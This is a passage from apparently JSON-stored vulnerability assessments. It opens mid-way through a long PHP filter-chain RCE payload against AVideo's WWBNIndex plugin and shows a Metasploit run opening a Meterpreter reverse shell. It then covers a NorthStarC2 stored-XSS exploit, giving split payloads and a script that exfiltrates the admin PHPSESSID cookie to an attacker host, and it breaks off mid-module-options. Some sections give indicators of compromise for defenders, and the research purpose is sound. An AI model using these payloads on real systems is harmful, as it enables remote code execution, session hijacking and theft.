|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\r\n```\r\n\r\nWith tcpdump running in a separate terminal we can see ICMP requests start coming from `example.com` which is `172.16.199.131`\r\n```\r\n\u279c  metasploit-framework git:(upstream-master) \u2717 sudo tcpdump -i any icmp\r\nPassword:\r\ntcpdump: data link type PKTAP\r\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\r\nlistening on any, link-type PKTAP (Apple DLT_PKTAP), snapshot length 524288 bytes\r\n08:49:08.893463 IP example.com > 172.16.199.1: ICMP echo request, id 1, seq 164, length 64\r\n08:49:08.893468 IP example.com > 172.16.199.1: ICMP echo request, id 1, seq 164, length 64\r\n08:49:08.893494 IP 172.16.199.1 > example.com: ICMP echo reply, id 1, seq 164, length 64\r\n08:49:08.893496 IP 172.16.199.1 > example.com: ICMP echo reply, id 1, seq 164, length 64\r\n08:49:09.917575 IP example.com > 172.16.199.1: ICMP echo request, id 1, seq 165, length 64\r\n08:49:09.917579 IP example.com > 172.16.199.1: ICMP echo request, id 1, seq 165, length 64\r\n```\r\n# Metasploit Module Demo\r\nThe Metasploit Module has three separate targets which can be exploited:\r\n```\r\nmsf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > show targets\r\n\r\nExploit targets:\r\n=================\r\n\r\n    Id  Name\r\n    --  ----\r\n    0   Automatic\r\n=>  1   PHP In-Memory\r\n    2   Unix In-Memory\r\n    3   Windows In-Memory\r\n```\r\nWe we use the `PHP In-Memory` target for this demonstration which will allow us to get a PHP Meterpreter session on the target executing in the context of the user running the application which in this case will be `www-data`:\r\n```\r\nmsf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > set payload php/meterpreter/reverse_tcp\r\npayload => php/meterpreter/reverse_tcp\r\nmsf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > set target 1\r\ntarget => 1\r\nmsf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) > run\r\n\r\n[*] Started reverse TCP handler on 172.16.199.1:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target appears to be vulnerable. Detected vulnerable AVideo version: 12.4, with vulnerable plugin WWBNIndex running.\r\n[*] Sending stage (39927 bytes) to 172.16.199.131\r\n[*] Meterpreter session 1 opened (172.16.199.1:4444 -> 172.16.199.131:45702) at 2024-05-22 09:38:12 -0400\r\n\r\nmeterpreter > getuid\r\nServer username: www-data\r\nmeterpreter > sysinfo\r\nComputer    : msfuser-virtual-machine\r\nOS          : Linux msfuser-virtual-machine 6.2.0-35-generic #35~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct  6 10:23:26 UTC 2 x86_64\r\nMeterpreter : php/linux\r\nmeterpreter >\r\n```\r\n\r\n# IoCs\r\nThe [Wiki](https://github.com/WWBN/AVideo/wiki/How-to-install-LAMP,-FFMPEG-and-Git-on-a-fresh-Ubuntu-22.x-for-AVideo-Platform-version-11.x-or-newer) instructs users to install using a LAMP environment which means IoCs are most likely going to be found in the `/var/log/apache2` directory. I would suggest running the following `grep` command:\r\n\r\n```\r\nmsfuser@msfuser-virtual-machine:/var/log$ grep -r \"plugin/WWBNIndex/submitIndex.php\" ./\r\ngrep: ./boot.log: Permission denied\r\ngrep: ./vmware-vmtoolsd-root.log: Permission denied\r\ngrep: ./vmware-vmsvc-root.2.log: Permission denied\r\ngrep: ./btmp: Permission denied\r\ngrep: ./private: Permission denied\r\ngrep: ./gdm3: Permission denied\r\n./apache2/access.log:172.16.199.1 - - [22/May/2024:05:46:22 -0700] \"GET /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 963 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"\r\n./apache2/access.log:172.16.199.1 - - [22/May/2024:05:49:19 -0700] \"GET /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 963 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"\r\n./apache2/error.log.1:[Tue May 21 11:19:15.787030 2024] [php:warn] [pid 13160] [client 172.16.199.1:58523] PHP Warning:  Undefined array key \"systemRootPath\" in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log.1:[Tue May 21 11:19:15.787365 2024] [php:warn] [pid 13160] [client 172.16.199.1:58523] PHP Warning:  require_once(plugin/WWBNIndex/WWBNIndex.php): Failed to open stream: No such file or directory in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log.1:[Tue May 21 11:19:15.787387 2024] [php:error] [pid 13160] [client 172.16.199.1:58523] PHP Fatal error:  Uncaught Error: Failed opening required 'plugin/WWBNIndex/WWBNIndex.php' (include_path='.:/usr/share/php') in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php:6\\nStack trace:\\n#0 {main}\\n  thrown in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:46:22.086098 2024] [php:warn] [pid 14828] [client 172.16.199.1:49163] PHP Warning:  Undefined array key \"systemRootPath\" in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:46:22.086170 2024] [php:warn] [pid 14828] [client 172.16.199.1:49163] PHP Warning:  require_once(plugin/WWBNIndex/WWBNIndex.php): Failed to open stream: No such file or directory in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:46:22.086186 2024] [php:error] [pid 14828] [client 172.16.199.1:49163] PHP Fatal error:  Uncaught Error: Failed opening required 'plugin/WWBNIndex/WWBNIndex.php' (include_path='.:/usr/share/php') in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php:6\\nStack trace:\\n#0 {main}\\n  thrown in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:49:19.874976 2024] [php:warn] [pid 14825] [client 172.16.199.1:49220] PHP Warning:  Undefined array key \"systemRootPath\" in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:49:19.875069 2024] [php:warn] [pid 14825] [client 172.16.199.1:49220] PHP Warning:  require_once(plugin/WWBNIndex/WWBNIndex.php): Failed to open stream: No such file or directory in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:49:19.875100 2024] [php:error] [pid 14825] [client 172.16.199.1:49220] PHP Fatal error:  Uncaught Error: Failed opening required 'plugin/WWBNIndex/WWBNIndex.php' (include_path='.:/usr/share/php') in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php:6\\nStack trace:\\n#0 {main}\\n  thrown in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/access.log.1:172.16.199.1 - - [21/May/2024:11:19:15 -0700] \"GET /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 963 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"\r\n./apache2/access.log.1:172.16.199.1 - - [21/May/2024:11:19:15 -0700] \"POST /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 0 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"\r\n```\r\n\r\nPay close attention to the apache `error.log`. This line indicates an attacker could have attempted to exploit the vulnerability but attempted to run a command that failed and thus the vulnerable require statement on line 6 of `submitIndex.php` that facilitates the RCE also failed: \r\n`./apache2/error.log.1:[Tue May 21 11:19:15.787387 2024] [php:error] [pid 13160] [client 172.16.199.1:58523] PHP Fatal error:  Uncaught Error: Failed opening required 'plugin/WWBNIndex/WWBNIndex.php' (include_path='.:/usr/share/php') in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php:6\\nStack trace:\\n#0 {main}\\n  thrown in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6`\r\n\r\nAlso pay close attention to the apache `access.log`. This line indicates an attacker could have attempted to access the vulnerability:\r\n`./apache2/access.log:172.16.199.1 - - [22/May/2024:05:49:19 -0700] \"GET /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 963 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"`\r\n\r\nNote that the presence of both of the log lines highlighted above do not necessarily indicate the system has been compromised, they could be from normal operation. However on a compromised system, if an attacker did not clean up after themselves (delete those log files) it's very likely traces like the ones mentioned above would be present. \r\n\r\n# Obtaining a Vulnerable version\r\n\r\nThe WWBNIndex Plugin is installed by default on the most recent patched versions. There is only one affected release (12.4) available for [download](https://github.com/WWBN/AVideo/releases/tag/12.4)on the official GitHub page and the vulnerable plugin does not exist in this release. The original exploit author doesn't mention having to install the vulnerable plugin in order for the application to be vulnerable, they mention:\r\n\r\n> This particular vulnerability lies within the WWBNIndex plugin \u2014 a crucial component for the platform\u2019s functionality\r\n\r\nIt seems as though all vulnerable versions have been removed from the GitHub release section. If you want to install a vulnerable version, please checkout the following [branch](https://github.com/WWBN/AVideo/pull/8369) on the AVideo GitHub page and install the application from there.\r\n\r\n# Attacker Value and Exploitability \r\nI gave this vulnerability the Attacker Value and Exploitability values I did because of the unauthenticated unprivileged access it gives to an attacker. Also because of how easy the vulnerability is to exploit and for how reliable the exploit is.  \r\n\r\n\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "0e9af56e-90c5-4900-8384-9d33bdfe7e26",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "480db1ba-7e3b-45b6-8b88-93847da9270e",
      "created": "2024-05-22T21:52:42.995757Z",
      "revisionDate": "2024-06-05T15:14:22.495531Z",
      "document": " [NorthStarC2]([https://github.com/EnginDemirbilek/NorthStarC2](https://github.com/EnginDemirbilek/NorthStarC2)) is an open source web based command and control framework used by real world threat actors including [UNC3890](https://www.mandiant.com/resources/blog/suspected-iranian-actor-targeting-israeli-shipping), [APT33](https://exchange.xforce.ibmcloud.com/collection/Recent-Hive0016-Infrastructure-and-Use-of-NorthStarC2-Pentest-Framework-77196fe57bb122088c210286da5d5b20) and [Patchwork/APT-Q-36](https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/may-hot-apt-security-events-techniques-tracker) to name a few. NorthStar C2, prior to commit `7674a44` on March 11 2024, contains a vulnerability where the logs page is\r\nvulnerable to a stored XSS. An unauthenticated user can simulate an agent registration to cause the XSS and take over a user's session. With this access, it is then possible to run a new payload on all of the NorthStar C2 compromised hosts (agents), and kill the original agent.\r\n\r\n# Obtaining Unauthenticated Stored XSS \r\n\r\nA route exists such that a portion of an unauthenticated request would be persistently reflected on the admin web panel without sanitization, allowing for stored XSS. Before delving into the exploitation details, let's understand the NorthStar C2 stager registration flow. The docs state:\r\n\r\n>The stager registration process consists of 2 phases;\r\n>\r\n>First phase:\r\n>\r\nNorthStar Stager sends an unique id value to login.php with HTTP POST method. This value is XORed with a hard-coded key and is in base64 format.\r\nThe C2 Server decrypts this value and checks if the unique id starts with a \"N\", ends with a \"q\" and is less than 20 characters.If everything checks out, the value is registered into the C2 database.\r\nA second XOR key, which will be used for communications, is transferred from NorthStar C2 Server to NorthStar Stager.\r\nNorthStar Stager receives and registers the XOR key.\r\n\r\nThe registration routes mentioned above are accessible prior to authentication (which is by the design). According to the docs, some checks are conducted to determine a valid ID, but there is no mention of any additional sanitation. The implementation of these checks in the code can be examined inside the following file:\r\n\r\n`NorthStarC2/chcksid.php`\r\n![checksid.php](https://github.com/rapid7/metasploit-framework/assets/23320005/5cd510ab-c376-40b5-a2d4-9daeb0f17364)\r\n\r\nThe agent ID (or the `$_POST['sid']` parameter in the above code which is saved to the `$str` variable) has no real strict sanitization.  The agent ID is checked to ensure the first character is `N`, the last character is `q` and that the length is less than `20` - these loosely made checks can be exploited.\r\n\r\nTracing the path of this parameter to its sink leads us to the `login.php` file, where the `checksid.php` file is included and the `$str` variable is used. Notice how there is no further sanitization performed here:\r\n\r\n`NorthStarc2/login/php`:\r\n![login.php](https://github.com/rapid7/metasploit-framework/assets/23320005/58770795-889e-42cd-82ae-985acc2be9dd)\r\n\r\nThe `updateLogs` function inserts the `$str` parameter (which is now called `$logClient`) directly into the database:\r\n\r\n`NorthStarC2/functions/updateLogs.function.php`\r\n![update_logs](https://github.com/rapid7/metasploit-framework/assets/23320005/8d18c535-dabe-446c-b2b0-2d26814123e9)\r\n\r\nNow in order to exploit this stored XSS vulnerability we must determine where the database is queried and what page displays the information we're able to store in the database. \r\n\r\nThe file `logs.php` queries the database and displays the unfiltered output directly to the webpage:\r\nThe `agentID` (in this case `logClient`) can be seen being echoed to the page without sanitization:\r\n\r\n`NorthStarC2/logs.php`:\r\n![logs.php](https://github.com/rapid7/metasploit-framework/assets/23320005/497f483f-4347-4f06-b9d2-0734c46fa5a9)\r\n\r\nIf there was no length limitation on the agentID parameter, we would be able to send the following payload:\r\n```js\r\nN<script>alert(1)</script>q\r\n```\r\nand obtain stored XSS with ease. However the above payload is 26 characters and will not be accepted by the application. \r\n\r\nSo, in order to work around this limitation, javascript comments can be used to connect multiple, shorter payloads. Because the newest logs appear at the top of the table, the last part of the payload is sent first.\r\n\r\nFor example, in order to create the 26 character stored XSS payload mentioned above, the following three payload can be sent in this order, remembering that they all need to start with `N`, end with `q` and be less than 20 characters:\r\n\r\nPayload #1:\r\n```js\r\nN*/</script>q\r\n```\r\n\r\nPayload #2:\r\n```js\r\nN*/alert(1)/*q\r\n```\r\n\r\nPayload #3:\r\n```js\r\nN<script>/*q\r\n```\r\n\r\nThe payload will appear like so in the DOM:\r\n```js\r\nN<script>/*qN*/alert(1)/*qN*/</script>q\r\n```\r\n\r\nand voila, stored XSS can be achieved. \r\n\r\n# Stealing Cookies\r\n\r\nRequests to the NorthStarC2 web application are authenticated by the `PHPSESSID` cookie. By using the stored XSS vulnerability outlined above, we can exfiltrate the `PHPSESSID` cookie value of an admin user back to the attacker machine. With that cookie in our possession we can take control of all the agents connected to the NorthStarC2 application and run arbitrary commands on all agents connected to the NorthStarC2 application. \r\n\r\nThis is an array of payloads (in the specific reverse order such that they get echoed to the page in the correct order) that can send to the application in order to steal the `PHPSESSID` cookie: \r\n```python\r\nsid_payloads = [\"N*/</script><q\", \"N*/i.src=u/*q\", \"N*/new Image;/*q\", \"N*/var i=/*q\", \"N*/s+h+p+'/'+c;/*q\", \"N*/var u=/*q\", f\"N*/'{protocol}';/*q\", \"N*/var s=/*q\", f\"N*/':{port}';/*q\", \"N*/var p=/*q\", \"N*/a+b;/*q\", \"N*/var h=/*q\", f\"N*/'{h2}';/*q\", \"N*/var b=/*q\", f\"N*/'{h1}';/*q\", \"N*/var a=/*q\", \"N*/d.cookie;/*q\", \"N*/var c=/*q\", \"N*/document;/*q\", \"N*/var d=/*q\", \"N</td><script>/*q\"]\r\n```\r\n\r\nThis is how it will appear once echoed to the DOM of the logs page: \r\n```js\r\nN</td><script>/*qN*/var d=/*qN*/document;/*qN*/var c=/*qN*/d.cookie;/*qN*/var a=/*qfN*/'{h1}';/*qN*/var b=/*qfN*/'{h2}';/*qN*/var h=/*qN*/a+b;/*qN*/var p=/*qfN*/':{port}';/*qN*/var s=/*qfN*/'{protocol}';/*qN*/var u=/*qN*/s+h+p+'/'+c;/*qN*/var i=/*qN*/new Image;/*qN*/i.src=u/*qN*/</script><q\r\n```\r\n\r\nAnd this is the actual javascript code in readable form, without the comments and the `q`'s and the `N`'s required by the sanitization:\r\n```js\r\n</td><script>\r\nvar d=document;\r\nvar c=d.cookie;\r\nvar a='{h1}';\r\nvar b='{h2}';\r\nvar h=a+b;\r\nvar p=':{port}';\r\nvar s='{protocol}';\r\nvar u=s+h+p+'/'+c;\r\nvar i=new Image;\r\ni.src=u;\r\n</script>\r\n```\r\n\r\nOnce the cookie has been obtained, attackers can use it to interact with the web panel as an authenticated user, which gives them the ability to execute arbitrary commands on all the agents. \r\n# Required User Interaction\r\nNote that the javascript payload will only get run once an authenticated user navigates to the `logs.php` page. The `logs.php` page does refresh itself periodically so if an operator already has the logs page open it might fire without someone directly opening it, in that specific scenario. \r\n\r\n# IoCs\r\n\r\nIf you're running an instance of NorthStar C2, prior to commit `7674a44` on March 11 2024 and you'd like to see if you've been affected, one way would be to connect to the database that was configured to be used by the application (depending on how your database is setup the command to connect could be similar to `sudo mysql -u root -p` ) and run `select * from logs;` once using the specific database. \r\n\r\nBelow is a screenshot of an affected host. Notice how in the `logClient` column in rows 1 through 13 appear to be normal but then rows 14 through 34 all appear to include `N*/<javascript code>/*q`. This is where the attacker has stored, the Stored XSS and is the very code used to steal the admin session cookie and exfiltrate it to themselves.\r\n![ioc_dataabse](https://github.com/rapid7/metasploit-framework/assets/23320005/0b801896-673c-4c19-a6a5-9d690f992b0f)\r\n\r\nOn an affected system, it is likely that the affected database rows would still be there as this attack gives the attacker control over the agents connected to the host and not to the host itself which is running the database in question. So it would be non-trivial for the attacker to erase these footsteps in this scenario. \r\n\r\n# Metasploit Module Demo\r\nTesting NorthstarStager.exe compiled on Windows 10 (19045) connected to NorthstarC2 installed on Ubuntu 22.04. Both the host and agent running on the vulnerable commit `e7fdce148b6a81516e8aa5e5e037acd082611f73`\r\n```\r\nmsf6 exploit(windows/http/northstar_c2_xss_to_agent_rce) > options\r\n\r\nModule options (exploit/windows/http/northstar_c2_xss_to_agent_rce):\r\n\r\n   Name       Current Setting  Required  Description\r\n   ----       ---------------  --------  -----------\r\n   KILL       false            no        Kill the NorthStar C2 agent\r\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\r\n   RHOSTS     172.16.199.131   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\r\n   RPORT      80               yes       The target port (TCP)\r\n   SRVHOST    172.16.199.1     yes       The local 